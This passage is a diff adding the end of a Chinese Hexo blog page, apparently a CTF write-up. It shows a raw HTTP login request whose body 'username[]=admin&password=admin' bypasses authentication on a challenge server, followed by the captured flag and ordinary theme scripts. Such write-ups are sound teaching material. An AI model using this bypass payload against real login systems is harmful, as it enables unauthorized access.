NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://121.40.176.232:10001/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql">username[]=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure>
+
+<p>得到 flag{nodejs_1s_v3ry_3@sy}</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-php-misc-crypto-aes-paillier/">web, php, misc, crypto, aes, paillier</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/19/LFI%E6%BC%8F%E6%B4%9E_include_require/">
+                        <span class="hidden-mobile">php 本地文件包含漏洞(LFI)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <p>到底啦</p> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        loader: {
+          load: ['ui/lazy']
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js" ></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({"theme":"default"});
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
